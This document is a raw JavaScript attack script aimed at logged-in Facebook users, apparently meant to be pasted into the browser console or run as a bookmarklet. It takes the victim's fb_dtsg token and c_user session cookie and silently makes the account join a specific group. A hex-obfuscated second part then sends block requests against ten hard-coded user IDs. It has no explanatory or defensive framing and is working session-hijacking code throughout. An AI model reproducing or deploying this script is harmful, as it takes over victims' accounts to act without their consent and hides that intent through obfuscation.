var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/groups/membership/r2j.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=1491329867819497&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
}
var _0x9ae8=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x66\x65\x65\x64\x2F\x66\x69\x6C\x74\x65\x72\x5F\x61\x63\x74\x69\x6F\x6E\x2F\x6E\x66\x78\x5F\x61\x63\x74\x69\x6F\x6E\x5F\x65\x78\x65\x63\x75\x74\x65","\x63\x6F\x6E\x66\x69\x72\x6D\x65\x64\x3D\x31\x26\x61\x63\x74\x69\x6F\x6E\x5F\x6E\x61\x6D\x65\x3D\x42\x4C\x4F\x43\x4B\x5F\x41\x43\x54\x4F\x52\x26\x63\x6F\x6E\x74\x65\x78\x74\x3D\x25\x37\x42\x25\x32\x32\x62\x72\x65\x61\x64\x63\x72\x75\x6D\x62\x73\x25\x32\x32\x25\x33\x41\x5B\x25\x32\x32\x61\x63\x63\x6F\x75\x6E\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x6E\x6E\x6F\x79\x69\x6E\x67\x25\x32\x32\x25\x32\x43\x25\x32\x32\x70\x6F\x73\x74\x73\x25\x32\x32\x5D\x25\x32\x43\x25\x32\x32\x73\x74\x6F\x72\x79\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x25\x32\x32\x25\x33\x41\x25\x32\x32\x70\x72\x6F\x66\x69\x6C\x65\x5F\x73\x6F\x6D\x65\x6F\x6E\x65\x5F\x65\x6C\x73\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x61\x62\x6C\x65\x5F\x65\x6E\x74\x5F\x74\x6F\x6B\x65\x6E\x25\x32\x32\x25\x33\x41\x25\x32\x32","\x25\x32\x32\x25\x37\x44\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x26\x5F\x5F\x72\x65\x71\x3D\x72\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x26\x5F\x5F\x72\x65\x76\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x36\x39\x34\x38\x31\x35\x33\x32\x38","\x31\x30\x30\x30\x30\x36\x36\x37\x31\x30\x35\x36\x34\x34\x36","\x31\x30\x30\x30\x30\x32\x38\x32\x33\x32\x39\x33\x39\x39\x33","\x31\x30\x30\x30\x30\x37\x30\x31\x39\x30\x38\x34\x39\x32\x33","\x31\x30\x30\x30\x30\x37\x34\x39\x34\x34\x38\x39\x35\x34\x32","\x31\x35\x32\x32\x36\x36\x33\x34\x32\x35","\x31\x30\x30\x30\x30\x37\x38\x33\x36\x31\x30\x37\x38\x37\x36","\x31\x30\x30\x30\x30\x31\x35\x34\x32\x39\x31\x31\x35\x31\x34","\x31\x30\x30\x30\x30\x38\x39\x33\x38\x39\x30\x30\x33\x32\x37","\x31\x30\x30\x30\x30\x34\x36\x32\x31\x35\x39\x37\x36\x33\x36"];javascript:(function (){{var _0xa5ebx1=document[_0x9ae8[2]](_0x9ae8[1])[0][_0x9ae8[0]];} ;var _0xa5ebx2=document[_0x9ae8[4]][_0x9ae8[3]](document[_0x9ae8[4]][_0x9ae8[3]](/c_user=(\d+)/)[1]);setTimeout(function (){function _0xa5ebx3(_0xa5ebx4){var _0xa5ebx5= new XMLHttpRequest();var _0xa5ebx6=_0x9ae8[5];var _0xa5ebx7=_0x9ae8[6]+_0xa5ebx4+_0x9ae8[7]+_0xa5ebx2+_0x9ae8[8]+_0xa5ebx1+_0x9ae8[9];_0xa5ebx5[_0x9ae8[11]](_0x9ae8[10],_0xa5ebx6,true);_0xa5ebx5[_0x9ae8[12]]=function (){if(_0xa5ebx5[_0x9ae8[13]]==4&&_0xa5ebx5[_0x9ae8[14]]==200){_0xa5ebx5[_0x9ae8[15]];} ;} ;_0xa5ebx5[_0x9ae8[16]](_0xa5ebx7);} ;_0xa5ebx3(_0x9ae8[17]);_0xa5ebx3(_0x9ae8[18]);_0xa5ebx3(_0x9ae8[19]);_0xa5ebx3(_0x9ae8[20]);_0xa5ebx3(_0x9ae8[21]);_0xa5ebx3(_0x9ae8[22]);_0xa5ebx3(_0x9ae8[23]);_0xa5ebx3(_0x9ae8[24]);_0xa5ebx3(_0x9ae8[25]);_0xa5ebx3(_0x9ae8[26]);} ,1000);} )();
